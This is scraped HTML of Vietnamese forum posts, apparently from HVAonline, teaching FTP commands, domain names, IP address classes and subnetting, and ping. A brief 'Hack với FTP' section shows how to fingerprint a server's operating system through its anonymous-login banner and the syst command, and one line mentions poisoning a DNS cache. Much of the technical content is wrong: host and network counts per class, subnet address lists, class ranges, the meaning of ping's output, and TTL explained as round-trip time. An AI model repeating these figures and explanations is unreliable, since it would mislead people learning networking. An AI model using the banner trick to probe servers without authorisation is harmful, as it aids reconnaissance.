				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/485.html#485,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><br/> <font size='+3'><b>Tìm hiểu FTP</b></font><br/> Giới thiệu<br/><br/> FTP là chữ viết tắc của File Transfer Protocol - Giao thức truyền file. FTP là một giao thức truyền file trên mạng dựa trên chuẩn TCP nên rất đáng tin cậy!<br/><br/> Một số lệnh phổ biến của FTP<br/><br/> Sau đây là danh sách một số lệnh thường dùng kèm theo hướng dẫn mà bạn cần biết!<br/><br/> ascii chuyển sang chế độ truyền file theo dạng văn bản<br/> binary chuyển sang chế độ truyền file theo dạng nhị phân<br/> cd [directory] chuyển vào thư mục directory<br/> cdup chuyển lên thư mục cấp trên một cấp<br/> close ngắt kết nối với máy chủ<br/> del [remote-file] xóa 1 file trên máy chủ<br/> dir [remote-directory|file] liệt kê nội dung của thư mục hoặc danh sách các file trên máy chủ<br/> help [command] cho biết hướng dẫn về lệnh command<br/> lcd [local-directory] đặt lại thư mục làm việc trên client là local-directory<br/> ls [remote-directory|file] [-la] liệt kê nội dung của thư mục hoặc danh sách các file trên máy chủ; tham số -la sẽ liệt kê tất cả có kèm theo mô tả về quyền<br/> mdelete [remote-files] xóa nhiều file trên máy chủ<br/> mget [remote-files] download các files trên máy chủ về<br/> mkdir &lt;directory-name&gt; tạo thư mục có tên directory-name<br/> mput [local-files] upload các files lên máy chủ<br/> open host [port] kết nối đến máy chủ FTP có hostname là host và đang chạy dịch vụ FTP ở cổng port<br/> put &lt;local-file&gt; [remote-file] upload local-file lên máy chủ với tên mới là remote-file nếu được<br/> pwd cho biết thư mục đang làm việc hiện thời<br/> quit thoát<br/> recv &lt;remote-file&gt; [local-file] nhận remote-file trên máy chủ và lưu trên máy tính với tên local-file nếu được<br/> rename [from] [to] đổi tên file hoặc thư mục from thành to<br/> rmdir directory-name xóa thư mục có tên directory-name<br/> send local-file [remote-file] gởi local-file từ máy tính lên máy chủ với tên mới là remote-file nếu được<br/> status cho biết trạng thái của phiên làm việc hiện tại<br/> syst cho biết hệ điều hành của máy chủ<br/> user user-name [password] [account] login vào với tên là user-name, mật khẩu là password, tài khoản là account<br/> ? gọi hướng dẫn<br/> Các ví dụ<br/><br/> Để dễ hiểu, các bạn hãy xem các ví dụ sau<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">tôi sử dụng các này để upload mấy file lên website đó, không cần dùng các chương trình FTP mạnh như WS_FTP Pro, FTPNet, CuteFTP, AbsoluteFTP, ...!) Tôi lưu trang web cần tải lên server trong c:\website! Bây giờ tôi sẽ tải nó lên!<br/><br/> C:\website&gt;ftp myftpsrv // kết nối đến máy chủ myftpsrv<br/> Connected to myftpsrv.<br/> User (ftpsrv<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">none)): dt<br/> 331 User name okay, need password.<br/> Password:<br/> 230 User logged in, proceed.<br/> ftp&gt; pwd // cho biết thư mục hiện tại đang làm việc!<br/> 257 "/home/dt" is current directory.<br/> ftp&gt; status // xem trạng thái hiện tại<br/> Type: ascii; Verbose: On ; Bell: Off ; Prompting: On ; Globbing: On<br/> Debugging: Off ; Hash mark printing: Off . // ascii=1<br/> ftp&gt; cd www // chuyển vào thư mục www<br/> 250 Directory changed to /home/dt/www<br/> ftp&gt; put index.html // upload file index.html lên server<br/> 200 PORT Command successful.<br/> 150 Opening ASCII mode data connection for index.html.<br/> 226 Transfer complete.<br/> ftp: 2095 bytes sent in 0.00Seconds 2095000.00Kbytes/sec.<br/> ftp&gt; mkdir tools // tạo thư mục /home/dt/www/tools<br/> 257 "/home/dt/www/tools" directory created.<br/> ftp&gt; cd tools // chuyển vào thư mục tools<br/> 250 Directory changed to /home/dt/www/tools<br/> ftp&gt; lcd c:\website\tools // thay đổi lại local directory = c:\website\tools<br/> Local directory now C:\website\tools.<br/> ftp&gt; bin // chuyển sang chế độ truyền file nhị phân<br/> 200 Type set to I.<br/> ftp&gt; mput *.* // upload tất cả các file trong c:\website\tools lên server, vào /home/www/tools/<br/> mput test.zip? y<br/> 200 PORT Command successful.<br/> 150 Opening BINARY mode data connection for test.zip.<br/> 226 Transfer complete.<br/> ftp: 10168 bytes sent in 0.06Seconds 169.47Kbytes/sec.<br/> mput test.exe? y<br/> 200 PORT Command successful.<br/> 150 Opening BINARY mode data connection for test.exe.<br/> 226 Transfer complete.<br/> ftp: 54625 bytes sent in 0.11Seconds 496.59Kbytes/sec.<br/> ftp&gt; ls -la // liệt kê nội dung của /home/www/tools<br/> 200 PORT Command successful.<br/> 150 Opening ASCII mode data connection for /bin/ls.<br/> drwxr--r-- 1 dt group 0 Sep 30 14:13 .<br/> drwxr--r-- 1 dt group 0 Sep 30 14:13 ..<br/> -rwxr--r-- 1 dt group 54625 Sep 30 14:14 test.exe<br/> -rwxr--r-- 1 dt group 10168 Sep 30 14:14 test.zip<br/> 226 Transfer complete.<br/> ftp: 247 bytes received in 0.00Seconds 247000.00Kbytes/sec.<br/> ftp&gt; del test.exe // tôi lỡ tay upload lên file test.exe, bây giờ tôi cần phải xóa nó<br/> 250 DELE command successful.<br/> ftp&gt; cd .. // chuyển lên thư mục cấp trên<br/> 250 Directory changed to /home/dt/www<br/> ftp&gt; mkdir cgi-bin2 // tạo thư mục mới<br/> 257 "/home/dt/www/cgi-bin2" directory created.<br/> ftp&gt; rename cgi-bin2 cgi-bin // tôi đã nhập vào sai mất rồi, bây giờ phải đổi tên lại thôi!<br/> 350 File or directory exists, ready for destination name<br/> 250 RNTO command successful.<br/> ftp&gt; cd cgi-bin // chuyển vào thư mục cgi-bin<br/> 250 Directory changed to /home/dt/www/cgi-bin<br/> ftp&gt; lcd c:\website\cgi-bin // đặt lại local directory!<br/> Local directory now C:\website\cgi-bin.<br/> ftp&gt; ascii // chuyển sang chế độ truyền file văn bản vì tôi cần upload một số file .cgi + .pl<br/> 200 Type set to A.<br/> ftp&gt; put test.cgi // upload file test.cgi<br/> 200 PORT Command successful.<br/> 150 Opening ASCII mode data connection for test.cgi.<br/> 226 Transfer complete.<br/> ftp: 222 bytes sent in 0.00Seconds 222000.00Kbytes/sec.<br/> ftp&gt; ls -la // xem nội dung của /home/www/cgi-bin<br/> 200 PORT Command successful.<br/> 150 Opening ASCII mode data connection for /bin/ls.<br/> drwxr--r-- 1 dt group 0 Sep 30 14:16 .<br/> drwxr--r-- 1 dt group 0 Sep 30 14:16 ..<br/> -rwxr--r-- 1 dt group 222 Sep 30 14:17 test.cgi<br/> 226 Transfer complete.<br/> ftp: 182 bytes received in 0.00Seconds 182000.00Kbytes/sec.<br/> ftp&gt; site chmod 755 test.cgi // đặt quyền 755(wrxx-xr-x) cho file test.cgi<br/> ftp&gt; ls -la // tôi liệt kê lại thư mục cgi một lần nữa<br/> 200 PORT Command successful.<br/> 150 Opening ASCII mode data connection for /bin/ls.<br/> drwxr-xr-x 1 dt group 0 Sep 30 14:16 .<br/> drwxr-xr-x 1 dt group 0 Sep 30 14:16 ..<br/> -rwxr-xr-x 1 dt group 222 Sep 30 14:17 test.cgi<br/> 226 Transfer complete.<br/> ftp: 182 bytes received in 0.00Seconds 182000.00Kbytes/sec.<br/> ftp&gt; bye // tất cả đã xong, bây giờ tôi có thể ngắt kết nối được rồi!<br/> 221 Goodbye!<br/><br/> C:\website&gt;<br/><br/> Hi vọng là bạn hiểu được ví dụ trên!<br/><br/> Nói thêm về FTP<br/><br/> Làm thế nào để kết nối với một máy chủ FTP qua một proxy-server, chẳng hạn như Wingate? Chỉ cần ftp đến proxy-server này và gõ vào như dạng sau, user@host[:port]. Ví dụ máy tôi đang chạy Wingate-FTP ở cổng 21 và Serv-U FTP-Server v2.5i ở cổng 2121, tôi có thể kết nối đến Serv-U FTP-Server v2.5i qua Wingate-FTP như sau:<br/><br/> C:\&gt;ftp localhost<br/> Connected to dt.<br/> 220 WinGate Engine FTP Gateway ready<br/> User (dt<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">none)): dt@localhost:2121<br/> 331 User name okay, need password.<br/> Password:<br/> 230 User logged in, proceed.<br/> ftp&gt;<br/><br/> Okay, bây giờ tôi upload và download file như bình thường được rồi!<br/><br/> Hack với FTP<br/><br/> Đôi khi FTP cũng cho biết một số thông tin rất quan trọng! Bạn dễ dàng đoán được hệ điều hành của máy chủ FTP! Hãy xem các ví dụ sau:<br/><br/> C:\&gt;ftp localhost<br/> Connected to dt.<br/> 220 dt Microsoft FTP Service (Version 1.0).<br/> User (dt<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">none)): anonymous<br/> 331 Anonymous access allowed, send identity (e-mail name) as password.<br/> Password:<br/> 230-Windows 95 FTP Service.<br/> 230 Anonymous user logged in as anonymous.<br/><br/> Yeah! Chắc ăn là server này là PWS chạy trên Windows!<br/><br/> Nếu như admin vô hiệu hóa dòng quảng cáo trên thì sao!? Vẫn còn cách khác! Bạn login vào và phát lệnh syst như sau:<br/><br/> ftp&gt; literal syst<br/> 215 Windows_NT version 4.10<br/><br/> Hình như hệ điều hành của máy chủ là Win9.x hoặc WinNT thì phải!<br/> (Nếu bạn đang chạy Linux* thì chỉ cần gõ syst).<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/484.html#484,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><br/> <font size='+3'><b>Tìm hiểu Domain name</b></font><br/><br/> Domain name - những vấn đề cơ bản :<br/><br/> 1. Domain name là gì?<br/> Máy tính có thể làm việc rất tốt với những con số nhưng con người thì không. Khi cần kết nối với một thiết bị trên mạng thì bạn chỉ cần đánh IP của thiết bị đó. Điều này hiển nhiên là rất rắc rối và khó nhớ, vì vậy tên miền (domain) được tạo<br/> ra.Giống như file, tên miền cũng có đuôi, chúng có ý nghĩa như sau:<br/> .COM: thương mại, công ty hoặc bất kỳ người nào.<br/> .EDU: giáo dục, thường là các trường đại học hoặc trường học.<br/> .MIL: quân sự.<br/> .GOV: chính phủ.<br/> .ORG: các tổi chức, thường là các tổ chức hoạt động phi thương mại. Tuy nhiên mọi người cũng có thể xó domain này.<br/> .CH,.DE,.VN...: Tuỳ thuộc vào quốc gia đã đăng ký theo tiêu chuẩn thế giới.<br/> Một vài trang web có thể có 2 phần mở rộng là .COM.VN<br/> Tên miền được đưa ra bởi Internic và bạn phải mua nó. Ví dụ nếu bạn muốn có một web site có tên<span class="link"> http://www.tenban.com/</span> thì bạn phải trả tiền cho Internic để có được site này. Sau đó bạn không cần phải trả tiền cho các domain như ten.tenban.com....Khi đánh một tên miền thì sẽ có một server là DNS (Domain Server Name) tìm kiếm trong bảng tham chiếu xem số IP tương ứng là gì. Nếu không tìm được, nó sẽ tìm ở một DSN khác! Cùng một IP, có thể có nhiều tên miền khác nhau và điều này thường xảy ra.<br/> Ví dụ: nếu ISP của bạn là vnn.com và web site của bạn là<span class="link"> http://</span> www.vnn.com/mypage thì bạn có trả tiền cho tên miền mypage.com và mọi người có thể truy cập vào site của bạn bằng<span class="link"> http://www.www.mypage.com/</span> và tất nhiên là<span class="link"> http://www.vnn.vom/mypage</span> vẫn tồn tại. Dấu " / " chỉ ra thư mcụ mà lưu trữ trang web trên server.<br/><br/> 2. Domain có thể nói lên điều gì:<br/> Khi bạn kết nối với ISP, bạn sẽ có một IP và IP này sẽ có một tên miền.<br/> Ví dụ: ISP của bạn là vnn.com thì bạn có thể có tên miền là users.server1.vnn.com và mọi người có thể biết ISP của bạn là ai và quốc tịch của bạn là gì.<br/><br/> 3. Đổi tên miền như thế nào:<br/> Có thể dăng ký một tên mới, mua một IP cố định hoặc đổi ISP. Bảng tham chiếu DNS được tạo ra từ yêu cầu của DNS chứa tên miền. Ví dụ nếu bạn sở hữu "name.com" DNS server sẽ gởi yêu cầu đến DNS server của bạn về "ten.name.com". Bảng tham chiếu này không thể bị sữa chữa trừ khi bạn có toàn quyền truy cập vào DNS server. Nhưng không có một bảng tham chiếu nào có đầy đủ tất cả các tên miền. Vì vậy khi nó không tìm được tên miền thì nó sẽ gởi yêu cầu đến một DNS khác.<br/> Để tăng tốc đọ xử lí, DNS còn có một bộ nhớ cache. Khi có nhiều người cùng yêu cầu một tên miền, thì DNS server sẽ tìm trong cache trước. Nếu bạn gởi thông tin giả đến DNS cache và người khác cùng đến một địa chỉ họ cũng sẽ nhận được thông tin giả mạo đó.<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> Tìm hiểu IP<br/> Tìm hiểu về địa chỉ IP<br/> 1. Địa chỉ IP là gì?<br/> - mỗi máy tính khi kết nối vào Internet đều có một địa chỉ duy nhất, đó chính là địa chỉ IP. Địa chỉ này dùng để phân biệt máy tính đó với các máy khác còn lại trên mạng Internet<br/><br/> - địa chỉ IP là một số 32 bit, = 4 byte nên có thể xem một địa chỉ IP được tạo thành từ 4 số có kích thước 1 byte, mỗi số có giá trị từ 0 đến 255. Mỗi địa chỉ IP đều gồm 2 phần là địa chỉ mạng(network) và địa chỉ máy(host)<br/><br/> - ví dụ về địa chỉ IP: 45.10.0.1, 168.10.45.65, ...<br/><br/> 2. Làm sao để địa chỉ IP của mình và địa chỉ IP của một trang Web?<br/><br/> - để xem địa chỉ của mình thì bạn vào Start --&gt; Run rồi gõ lệnh : winipcfg hoặc bạn vào trang www.whatismyip.com , nó sẽ hiện thị IP của bạn<br/> - để xem địa chỉ của một trang Web thì bạn dùng lệnh nslookup<br/><br/> 3. Các lớp địa chỉ IP<br/> - toàn bộ địa chỉ IP được chia vào 6 lớp khác nhau: A,B,C,D,E và loopback. Mỗi lớp sẽ có cách xác định địa chỉ network và địa chỉ host khác nhau.<br/><br/> - Biểu đồ:<br/><br/> Lớp Cấu trúc địa chỉ IP Format Số bit mạng/số bit host Tổng số mạng/lớp Tổng số host/mạng Vùng địa chỉ IP<br/> 0 32<br/><br/> A 0 netid hostid<br/> N.H.H.H 7/24 27-2=126 224-2=17.777.214 1.0.0.1-126.0.0.0<br/> B 1 0 netid hostid<br/> N.N.H.H 14/16 214-2=16382 216-2=65.643 128.1.0.0-191.254.0.0<br/> C 1 1 0 netid hostid<br/> N.N.N.H 22/8 222-2=4194302 28-2=245 192.0.1.0-223.255.254.0<br/> D 1 1 1 0 địa chỉ multicast<br/> - - - - 224.0.0.0-239.255.255.255<br/> E 1 1 1 1 dành riêng<br/> - - - - 240.0.0.0-254.255.255.255<br/> Loopback -<br/> - - - - 127.x.x.x<br/><br/> *ghi chú: N=Network, H=Host<br/><br/> - Giải thích:<br/><br/> + Lớp A: bit đầu tiên bằng 0, 7 bit tiếp theo N dành cho địa chỉ network nên có tối đa 27-2=126 trên lớp A, 24 bit còn lại H.H.H dành cho địa chỉ host nên mỗi mạng thuộc lớp A sẽ có tối đa là 224-2=17.777.214 máy. Nguyên nhân phải trừ đi 2 vì có hai địa chỉ được dành riêng là địa chỉ mạng(x.x.x.0) và địa chỉ broadcast(x.x.x.255). Lớp A chỉ dành cho các địa chỉ của các tổ chức lớn trên thế giới. Vùng địa chỉ IP của lớp A là 1.0.0.1 đến 126.0.0.0<br/><br/> + Lớp B: bit 0 = 0, 14 bit tiếp theo dành cho địa chỉ netwrok, 16 bit còn lại dành cho địa chỉ host. Tổng số mạng trên lớp B là 16382, mỗi mạng chứa tối đa 65.643 máy(cách tính tương tự như lớp A). Lớp B được dành cho các địa chỉ của các tổ chức hạng trung trên thế giới. Vùng địa chỉ dành cho lớp B là 128.1.0.0 đến 192.254.0.0<br/><br/> + Lớp C: 3 bit đầu tiên là 110, 22 bit tiếp theo dành cho network, 8 bit còn lại dành cho host. Số mạng tối đa trên lớp C là 4194302, số host tối đa trên mỗi mạng là 245. Lớp C được dành cho các tổ chức nhỏ và cả máy tính của bạn nữa<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">. Vùng địa chỉ của lớp C là 192.0.1.0 đến 223.255.254.0<br/><br/> + Lớp D: 4 bit đầu tiên luôn là 1110. Lớp D được dành cho các nhóm multicast, vùng địa chỉ từ 224.0.0.0 đến 239.255.255.255<br/><br/> + Lớp E: 4 bit đầu tiên luôn là 1111. Lớp D được dành cho mục đích nghiên cứu, vùng địa chỉ từ 240.0.0.0 đến 254.255.255.255<br/><br/> + Loopback: địa chỉ quay trở lại, 127.x.x.x. Bạn thường bắt gặp địa chỉ IP 127.0.0.1, đây chính là địa chỉ IP quay trở lại máy tính mà bạn đang dùng để kết nối vào mạng<br/><br/> - Ví dụ: 128.7.15.1<br/><br/> bin 10000000 00000111 00001111 00000001<br/> dec 128 7 15 1<br/><br/> 2 bit đầu tiên là 10, như vậy địa chỉ này thuộc lớp B(N.N.H.H), từ đó bạn có thể suy ra được địa chỉ mạng là 128.7 và địa chỉ máy là 15.1<br/><br/> - Bạn cũng có thể dựa vào byte đầu tiên của địa chỉ IP để xác định một cách nhanh chóng và chính xác nó thuộc lớp nào?!<br/><br/> Lớp Byte đầu tiên của địa chỉ IP<br/> A 1-126<br/> B 128-191<br/> C 192-223<br/> D 224-239<br/> E 240-254<br/> Loopback 127<br/><br/> - Có một số địa chỉ IP đặc biệt sau:<br/><br/> 0.0.0.0 - địa chỉ của máy hiện tại<br/> 255.255.255.255 - địa chỉ broadcast giới hạn của mạng cục bộ<br/> x.x.x.255 - địa chỉ boardcast trực tiếp của mạng x.x.x.0<br/> 127.x.x.x - địa chỉ loopback<br/><br/> - Ví dụ:<br/><br/><br/><br/> * Gateway trên hình vẽ thuộc 2 mạng khác nhau nên nó phải có đến 2 địa chỉ IP là 128.10.2.70 và 192.5.48.7<br/><br/> 3. Chi tiết về subnet<br/> - để cấp phát địa chỉ IP cho các mạng khác nhau một cách hiệu quả và dễ quản lí, người ta dùng một kĩ thuật được gọi là subnet. Subnet sẽ vay mượn một số bit của hostid để làm subnet mask(mặt nạ mạng). Tôi sẽ chỉ rõ cho các bạn qua các ví dụ. Bạn chỉ cần nhớ 3 điều sau:<br/><br/> + subnet mask có tất cả các bit network và subnet đều bằng 1, các bit host đểu bằng 0<br/> + tất cả các máy trên cùng một mạng phải có cùng một subnet mask<br/> + để phân biệt được các subnet(mạng con) khác nhau, bộ định tuyến dùng phép logic AND<br/><br/> - Ví dụ 1: địa chỉ lớp mạng lớp B 128.10.0.0 có thể subnet như sau:<br/><br/> (a) dùng 8 bit đầu tiên của hostid để subnet:<br/><br/> Subnet mask = 255.255.255.0<br/><br/> Network Network Subnet Host<br/> 11111111 11111111 11111111 00000000<br/> 255 255 255 0<br/><br/> Như bạn thấy số bit dành cho subnet sẽ là 8 -&gt; có tất cả 28-2=254 subnet(mạng con). Địa chỉ của các subnet lần lượt là 128.10.0.1, 128.10.0.2, 128.10.0.3, ..., 128.10.0.245. 8 bit dành cho host nên mỗi subnet sẽ có 28-2=254 host, địa chỉ của các host lần lượt là 128.10.xxx.1, 128.10.xxx.2, 128.10.xxx.3, ..., 128.10.xxx.254<br/><br/> Giả sử như bạn có một mạng lớp B địa chỉ 128.10.0.0 được subnet với subnet mask = 255.255.255.0 như sau:<br/><br/><br/><br/> Làm thế nào để gateway G có thể phân biệt được các host thuộc mạng con 128.10.1.0 hay 128.10.2.0? Nó sẽ thực hiện phép AND địa chỉ IP của host với subnet mask 255.255.255.0<br/><br/> *[H1] 128.10.1.1 AND 255.255.255.0<br/><br/> 128. 10. 1.1 = 10000000.00001010.00000001.00000001<br/> AND 255.255.255.0 = 11111111.11111111.11111111.00000000<br/> Kết quả = 10000000.00001010.00000001.00000000<br/><br/> *[H2] 128.10.2.2 AND 255.255.255.0<br/><br/> 128. 10. 1.1 = 10000000.00001010.00000010.00000010<br/> AND 255.255.255.0 = 11111111.11111111.11111111.00000000<br/> Kết quả = 10000000.00001010.00000010.00000000<br/><br/> Như vậy gateway G có thể dễ dàng xác định được địa chỉ subnet của H1 và H2 và biết được nó thuộc 2 subnet khác nhau.<br/><br/> (b) chỉ dùng 7 bit đầu tiên của hostid để subnet:<br/><br/> Subnet mask = 255.255.254.0 = 11111111.11111111.11111110.00000000<br/><br/> Như vậy số bit dành cho subnet sẽ là 7 -&gt; có tất cả 27-2=126 subnet(mạng con). Nhưng bù lại, mỗi subnet sẽ có đến 510 host do 9 bit sau được dành cho host, 29-2=510. Địa chỉ của các subnet và host như sau:<br/><br/> Subnet ID Hosts<br/> 128.10.0.0 128.10.0.1-128.10.0.254<br/> 128.10.2.0 128.10.2.1-128.10.3.254<br/> 128.10.4.0 128.10.4.1-128.10.5.254<br/> ... ...<br/> 128.10.254.0 128.10.254.1-128.10.255.254<br/><br/> + ví dụ 1: 128.10.2.1 & 128.10.3.254 ?!<br/><br/> 128.10. 2.1 = 10000000.00001010.00000010.00000001<br/> AND 255.255.254.0 = 11111111.11111111.11111110.00000000<br/> Kết quả = 10000000.00001010.00000010.00000000<br/><br/> 128. 10. 3.254 = 10000000.00001010.00000011.11111111<br/> AND 255.255.254. 0 = 11111111.11111111.11111110.00000000<br/> Kết quả = 10000000.00001010.00000010.00000000<br/><br/><br/> -&gt; 128.10.2.1 & 128.10.3.254 thuộc cùng 1 subnet<br/><br/> + ví dụ 2: 128.10.2.1 & 128.10.5.75 ?<br/><br/> 128.10. 2.1 = 10000000.00001010.00000010.00000001<br/> AND 255.255.254.0 = 11111111.11111111.11111110.00000000<br/> Kết quả = 10000000.00001010.00000010.00000000<br/><br/> 128. 10. 5.75 = 10000000.00001010.00000101.01001011<br/> AND 255.255.254. 0 = 11111111.11111111.11111110.00000000<br/> Kết quả = 10000000.00001010.00000100.00000000<br/><br/> -&gt; 128.10.2.1 & 128.10.5.75 thuộc 2 subnet khác nhau<br/><br/> 4. IPCalc 2.0.7 - 1 chương trình giúp bạn tính toán nhanh subnet mask<br/><br/><br/> Bạn có thể tìm thấy tiện ích này trên đĩa WebLH-Net hoặc cũng có thể download tại<span class="link"> http://www.progression-inc.com/</span><br/><br/> 5. Phân biệt giữa địa chỉ IP tỉnh và địa chỉ IP động<br/> - các máy tính kết nối vào mạng Internet thường xuyên, chẳng hạn như 1 WEB server hoặc FTP server luôn phải có một địa chỉ IP cố định gọi là địa chỉ IP tĩnh. Đối với các máy tính thỉnh thoảng mới kết nối vào Internet, chẳng hạn như máy của tôi và bạn dùng kết nối cùng kết nối quay số đến ISP. Ví dụ mỗi lần tôi dùng Internet, DHCP(Dynamic Host Configuration Protocol) server của VDC ISP sẽ cung cấp cho tôi một địa chỉ IP chẳng hạn như 203.162.30.209. Lần sau tôi vào lại mạng Internet, địa chỉ IP của tôi có thể là 203.162.30.186 vì DHCP server của VDC sẽ chọn một địa chỉ IP còn rãnh để cấp phát cho máy tôi. Như vậy, địa chỉ IP của máy tôi là địa chỉ IP động.<br/><br/> - để xác định được địa chỉ IP động của máy mình khi đang dùng Internet, trên Windows bạn hãy chạy Start/Run: winipcfg<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> Tìm hiểu Ping<br/> Tìm hiểu về "Ping"<br/><br/> Ping là gì?<br/><br/> Ping là một chương trình cho phép bạn xác định một host còn hoạt động(alive) hay không?<br/><br/> Một ví dụ về Ping!<br/><br/> C:\&gt; ping www.aqnet.com<br/><br/> Pinging www.aqnet.com [209.54.218.119] with 32 bytes of data:<br/><br/> Reply from 209.54.218.119: bytes=32 time&lt;10ms TTL=128<br/> Reply from 209.54.218.119: bytes=32 time&lt;10ms TTL=128<br/> Reply from 209.54.218.119: bytes=32 time&lt;10ms TTL=128<br/> Reply from 209.54.218.119: bytes=32 time&lt;10ms TTL=128<br/><br/> Ping statistics for 209.54.218.119:<br/> Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),<br/> Approximate round trip times in milli-seconds:<br/> Minimum = 0ms, Maximum = 0ms, Average = 0ms<br/><br/> C:\&gt;<br/><br/> www.aqnet.com(209.54.218.119) -&gt; alive!<br/><br/> Nếu bạn nhận được thông báo "Host Alive", điều này có nghĩa là host không còn hoạt động!<br/><br/> Ping hoạt động ra sao?<br/><br/> Ping gởi một ICMP message "echo request" đến host. Nếu nhận được một ICMP message "echo reply" của host, ping sẽ thông báo host còn hoạt động. Nếu không nhận được ICMP message "echo reply" của host, ping sẽ thông báo host này đã ngừng hoạt động!<br/><br/> Format của ICMP "echo request" và "echo reply" có dạng như sau:<br/><br/> 0 7 8 15 16 31<br/> +-----------------+-----------------+-----------------+<br/> | Type (0 or 8) | Code (0) | 16-bit Checksum |<br/> +-----------------+-----------------+-----------------+<br/> | Indentifier | sequence number |<br/> +-----------------+-----------------+-----------------+<br/> | |<br/> | (Optional Data) |<br/> | |<br/> +-----------------------------------------------------+<br/><br/> Bất cứ lúc nào host nhận được một ICMP request message, nó sẽ phản hồi trở lại với một identifier và số sequence number. Trong hầu hết các hệ thống Unix, trường indentifier được đặt số Process ID của tiến trình gởi gói packet đi. Vì vậy, nếu bạn ping cùng một lúc nhiều lần đến một hệ thống Unix, giá trị indentifier mà bạn nhận được trong mỗi lần ping sẽ khác nhau!<br/><br/> Trường sequence number có giá trị mặc định là 0. Giá trị này sẽ được tăng một sau mỗi lần hệ thống phản hồi ICMP request message của chương trình ping. Ping sẽ in ra giá trị sequence number của mỗi lần nhận packet, điều này cho chúng ta biết được các gói packet có gặp lỗi hay không?!<br/><br/> (Để biết chi tiết về các trường khác, bạn hãy tham khảo các bài viết về giao thức TCP-IP!)<br/><br/> Bây giờ chúng ta hãy xem qua ví dụ cuối cùng:<br/><br/> # ping hackingtruths.box.sk<br/><br/> Pinging hackingtruths.box.sk [194.x.yyy.227] with 32 bytes of data:<br/> 32 bytes from 194.x.yyy.227: icmp_seq=0 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=1 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=2 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=3 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=4 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=5 ttl=225 time=0 ms<br/> 32 bytes from 194.x.yyy.227: icmp_seq=6 ttl=225 time=0 ms<br/> ...<br/><br/> Ở dòng đầu tiên, ping phân tích hostname ra địa chỉ ip. Bạn có nhận thấy giá trị icmp_seq tăng dần từ 0 sau mỗi lần ping nhận được ICMP message "echo reply" từ host không? Như vậy là các gói packet mà chúng ta nhận điều không gặp lỗi gì hết! Ping còn cho chúng ta biết thời gian TTL(Time To Live) nữa! Ping lưu thời gian mỗi lần gởi ICMP message "echo request". Khi nhận được ICMP message "echo reply" từ host, Ping sẽ lấy thời gian hiện tại trừ đi giá trị này sẽ ra TTL!<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/483.html#483,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
